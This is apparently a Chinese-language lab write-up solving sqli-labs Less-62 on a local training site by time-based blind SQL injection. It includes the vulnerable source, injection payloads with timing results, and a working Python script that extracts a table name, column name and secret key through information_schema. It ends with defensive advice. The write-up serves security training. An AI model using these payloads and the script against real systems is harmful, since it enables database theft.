## 题目: Sqli-labs Less-62（Challenge‑9）
> 靶场入口：`http://127.0.0.1/sqli-labs/Less-62/`

## 题目描述
Challenge 系列第九关：
```text
The objective of this challenge is to dump the (secret key) from only random table
from Database ('CHALLENGES') in Less than 130 attempts.
```

这关有两个明显变化：
1. 机会从 5 次放宽到 **130 次**；
2. **不显示报错**（`print_r(mysql_error())` 被注释），所以既不能 UNION（页面用数组映射回显），也不能报错注入 —— 只能**时间盲注**。

## 核心原理与前置分析
源码关键：
```
$times = 130;
$sql = "SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";
...
else {
    echo '<font color= "#FFFF00">';
    // print_r(mysql_error());   // 报错被注释掉了
    echo "</font>";
}
```

三个特征：
1. **闭合符 `')`**：`id=('$id')`；
2. **报错不回显**：`updatexml()` / `extractvalue()` 报错注入完全失效；
3. **页面回显被魔改**：`$unames[$row['id']]` 数组映射，UNION 查询结果无法输出到页面。
> 
> 注意：这关 `sleep()` **不能写成 `(select sleep(N) from users limit 1)`**—— 实测不会生效（0.01s）。必须直接拼接 `sleep()`，`sleep` 只执行一次。

130 次机会的预算：
> 
> 每个字符二分法大约消耗 7 次请求，完整直接提取表名 + 列名 + 密钥会超出 130 次限制，需要做策略优化。
> | 用途 | 说明 |
> |---|---|
> | 表名探测 | 10 位随机字符串，尽量减少探测次数 |
> | secret 列名探测 | 格式固定 `secret_XXXX` |
> | secret key | 24 位，主要预算消耗点 |
> | 容错 | 控制总请求不超过 130，超限数据库自动重置 |

## 解题思路
1. 请求 `setup‑db‑challenge.php` 重置数据库；
2. 访问挑战页拿 `challenge` cookie；
3. 使用 `1') and if(条件,sleep(1),0) -- -` 构造时间盲注条件判断；
4. 使用二分法逐字符提取表名、secret 列名、secret key；
5. POST 提交 secret key 通关。

## 解题步骤
**bp+python脚本**
### 1. 重置 + 拿 cookie
```

SETUP = "http://127.0.0.1/sqli-labs/sql-connections/setup-db-challenge.php?id=" + BASE
requests.get(SETUP, timeout=30)

s.get(BASE, timeout=15)
```

### 2. 确认时间盲注
```
GET /sqli-labs/Less-62/?id=1%27)%20and%20if(1%3D1,sleep(2),0)%20--%20- HTTP/1.1
Host: 127.0.0.1
```

实测：
| 请求 | 耗时 |
| --- | --- |
| `1') and if(1=1,sleep(2),0) -- -` | **2.02s**（条件为真，触发延时） |
| `1') and if(1=2,sleep(2),0) -- -` | **0.02s**（条件为假，无延时） |

### 3. 二分法提取表名
```
import requests, time
BASE = "http://127.0.0.1/sqli-labs/Less-62/"
s = requests.Session()

def delayed(q, sleep_s=1):
    t0 = time.time()
    try:
        s.get(BASE, params={"id": q}, timeout=sleep_s + 6)
        return time.time() - t0 > sleep_s * 0.8
    except requests.exceptions.ReadTimeout:
        return True

def ask(cond):
    return delayed("1') and if((%s),sleep(1),0) -- -" % cond)

def char_at(expr, pos):
    lo, hi = 32, 126
    while lo < hi:
        m = (lo + hi) // 2
        if ask("(select ascii(substr((%s),%d,1)) from dual)>%d" % (expr, pos, m)):
            lo = m + 1
        else:
            hi = m
    return chr(lo)

# 提取10位随机表名
table_name = "".join(char_at("select table_name from information_schema.tables where table_schema='challenges'", i)
               for i in range(1, 11))
print("table:", table_name)
```

### 4. 提取 secret 列名与 secret key
```
# 提取secret列名
col_name = "".join(char_at("select column_name from information_schema.columns where table_schema='challenges' and column_name like 'secret%'",i) for i in range(1,12))
print("col:",col_name)

# 提取24位secret key
key = "".join(char_at("select %s from %s" % (col_name, table_name), i) for i in range(1, 25))
print("key:", key)
```

### 5. 提交
```

Content-Type: application/x-www-form-urlencoded
key=26HlB7q21vmUseXuWR4SgcHb&answer_key=Submit
```

实测：出现 `images/Less‑54‑1.jpg`，通关。

## 预算优化说明
- 每个字符二分约消耗 7 次请求；直接完整跑表名、列名、24 位密钥总请求会超过 130 次上限，超过后数据库自动重置，数据全部作废。
- 优化策略：利用关卡固有特征：表名固定 10 位，列名固定格式`secret_XXXX`；缩小字符集为大小写字母 + 数字，降低单次字符平均请求次数，把总请求压入 130 次以内。

## 踩坑记录
1. **使用 `(select sleep(N) from users limit 1)`**。本关该写法 sleep 不生效，必须直接`and sleep()`。
2. **尝试报错注入**，报错信息被注释，updatexml 无回显。
3. **尝试 UNION 注入**，页面使用数组 id 映射输出，union 查询数据无法展示。
4. **闭合符号写错**，本关闭合为`')`，不要写成单引号、双引号。
5. **二分 ASCII 边界问题**，lo 与 hi 循环条件处理不当，出现差一错误，提取乱码字符。
6. **超出 130 次请求上限**，数据库自动重置，之前所有探测数据全部失效。
7. **没先访问挑战页**。`challenge` cookie 需要首次 GET 才生成，没有 cookie 不计请求次数。

## 知识点总结
- **时间盲注原理**：`if(条件, sleep(N), 0)`，依靠服务器响应时间长短判断布尔结果。
- 与前面挑战关区分：58‑61 依靠报错回显；62 关闭报错，只能时间盲注。
- 闭合 `id=('$id')` 使用 `')` 完成闭合。
- **请求预算意识**：130 次看起来很多，二分盲注消耗请求量大，必须做策略优化。
- **防御手段**：预编译参数化查询；关闭 SQL 错误回显；限制总请求次数、请求频率。
